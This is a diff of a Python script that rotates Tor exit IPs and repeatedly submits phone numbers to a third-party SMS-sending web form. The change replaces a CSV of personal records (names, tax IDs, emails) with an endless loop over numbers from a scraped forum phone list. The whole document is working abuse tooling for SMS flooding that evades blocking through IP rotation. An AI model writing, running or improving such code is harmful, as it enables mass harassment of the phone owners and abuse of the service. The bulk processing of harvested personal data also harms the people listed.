@@ -1,4 +1,4 @@
-import csv
+import random
 import re
 import textwrap
 import requests
@@ -12,7 +12,7 @@ def call_me(num):
 	controller.signal(Signal.NEWNYM)
 	time.sleep(controller.get_newnym_wait())
 	current_ip = requests.get(url='http://icanhazip.com/')
-	print(f"New IP: {current_ip.text}")
+	print(f"Sending to {num} from IP: {current_ip.text}")
 
 	session.head('http://ossinfo.ru/otpravit-sms-na-mts.html')
 	response = session.post(
@@ -35,12 +35,13 @@ with Controller.from_port(port=9051) as controller:
 	controller.authenticate(password='')
 	socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
 	socket.socket = socks.socksocket
-	with open('numbers.csv', 'r') as file:
-		session = requests.Session()
-		reader = csv.reader(file)
-		for row in reader:
-			fio, phone, inn, login, orgname, email_list = row
-			num = re.sub('\D', '', phone)
+	session = requests.Session()
+
+	while True:
+		with open('phones_pikabu.txt', 'r') as file:
+			lines = file.readlines() 
+			random_line = random.choice(lines) if lines else None
+			num = re.sub('\D', '', random_line)
 			if len(num) == 11:
 				call_me(num)
 			elif len(num) % 11 == 0:
